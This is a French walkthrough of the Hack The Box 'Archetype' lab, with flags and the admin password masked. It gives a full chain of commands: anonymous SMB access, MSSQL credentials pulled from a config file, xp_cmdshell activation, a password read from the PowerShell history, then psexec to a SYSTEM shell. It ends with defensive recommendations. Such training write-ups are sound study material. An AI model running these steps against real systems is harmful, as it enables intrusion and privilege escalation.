# Hack The Box - Archetype Walkthrough FR

## Informations machine

- Plateforme: Hack The Box
- Machine: Archetype
- Difficulte: Very Easy
- Systeme: Windows
- Categorie: Starting Point

Cette version publique masque les flags et le mot de passe administrateur final. L'objectif est de documenter la methode, pas de publier un simple dump de reponses.

## 1. Enumeration

Un scan complet permet d'identifier les services exposes.

```bash
sudo nmap -p- 10.129.95.187
```

Les ports les plus importants sont:

```text
445/tcp   microsoft-ds   SMB
1433/tcp  ms-sql-s       Microsoft SQL Server
5985/tcp  wsman          WinRM
```

SMB et MSSQL sont les deux premiers axes d'enumeration.

## 2. Enumeration SMB

Le partage SMB est liste avec un utilisateur guest et un mot de passe vide.

```bash
smbclient -L //10.129.95.187 -U guest%
```

Un partage non administratif apparait:

```text
backups
```

Connexion au partage et recuperation du fichier de configuration:

```bash
smbclient //10.129.95.187/backups -U guest%
get prod.dtsConfig
```

Le fichier contient une chaine de connexion MSSQL:

```xml
<ConfiguredValue>
Data Source=.;Password=M3g4c0rp123;
User ID=ARCHETYPE\sql_svc;
Initial Catalog=Catalog;Provider=SQLNCLI10.1;
</ConfiguredValue>
```

Identifiants trouves:

```text
ARCHETYPE\sql_svc : M3g4c0rp123
```

## 3. Acces MSSQL

Connexion a SQL Server avec Impacket:

```bash
mssqlclient.py ARCHETYPE/sql_svc:'M3g4c0rp123'@10.129.95.187 -windows-auth
```

Verifications utiles:

```sql
SELECT name FROM sys.databases;
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Le retour de `IS_SRVROLEMEMBER('sysadmin')` vaut `1`, ce qui confirme que le compte possede des droits eleves sur SQL Server.

## 4. Activation de xp_cmdshell

`xp_cmdshell` permet d'executer des commandes Windows depuis MSSQL. Comme le compte est sysadmin, il est possible de l'activer.

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Test:

```sql
EXEC xp_cmdshell 'whoami';
```

Resultat:

```text
archetype\sql_svc
```

## 5. Flag utilisateur

```sql
EXEC xp_cmdshell 'dir C:\Users\sql_svc\Desktop';
EXEC xp_cmdshell 'type C:\Users\sql_svc\Desktop\user.txt';
```

```text
[REDACTED_USER_FLAG]
```

Sur Windows CMD, l'equivalent de `cat` est `type`.

## 6. Escalade de privileges

Apres l'execution de commandes, l'etape logique est de fouiller le profil utilisateur courant.

```sql
EXEC xp_cmdshell 'dir C:\Users\sql_svc';
EXEC xp_cmdshell 'dir C:\Users\sql_svc\Desktop';
EXEC xp_cmdshell 'dir C:\Users\sql_svc\Documents';
```

Un emplacement tres interessant sur Windows est l'historique PowerShell:

```text
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Lecture de l'historique de `sql_svc`:

```sql
EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';
```

La sortie contient une commande avec un mot de passe administrateur:

```text
net.exe use T: \\Archetype\backups /user:administrator [REDACTED_ADMIN_PASSWORD]
```

Le mot de passe n'a pas ete casse. Il etait present en clair dans l'historique de commandes.

## 7. Acces Administrator avec PsExec

Avec un mot de passe administrateur valide et SMB ouvert, PsExec permet d'obtenir un shell distant.

```bash
psexec.py administrator:'[REDACTED_ADMIN_PASSWORD]'@10.129.95.187
```

Verification:

```cmd
whoami
```

Resultat attendu:

```text
nt authority\system
```

Lecture du root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

```text
[REDACTED_ROOT_FLAG]
```

## 8. Chaine d'attaque

```text
SMB anonyme
-> partage backups lisible
-> prod.dtsConfig expose des identifiants MSSQL
-> connexion MSSQL comme sql_svc
-> sql_svc est sysadmin SQL Server
-> activation de xp_cmdshell
-> execution de commandes Windows
-> historique PowerShell avec mot de passe Administrator
-> PsExec
-> shell SYSTEM
```

## 9. Recommandations defensives

- Desactiver l'acces guest/anonyme sur SMB.
- Auditer regulierement les partages de sauvegarde.
- Ne pas stocker de mots de passe en clair dans des fichiers de configuration.
- Appliquer le principe du moindre privilege aux comptes de service.
- Limiter fortement les comptes sysadmin SQL Server.
- Surveiller `sp_configure`, `xp_cmdshell` et la creation de services Windows.
- Eviter de passer des mots de passe directement en ligne de commande.
- Controler les historiques PowerShell.
- Utiliser Windows LAPS pour les mots de passe administrateur locaux.

## 10. Lecons apprises

Le point le plus important de cette machine est que l'escalade de privileges ne repose pas toujours sur un exploit noyau ou un outil automatique.

Ici, l'element decisif etait un secret laisse dans l'historique PowerShell.

Bonne habitude pentest:

```text
Apres une execution de commandes, enumerer le profil utilisateur courant avant de chercher un exploit.
```
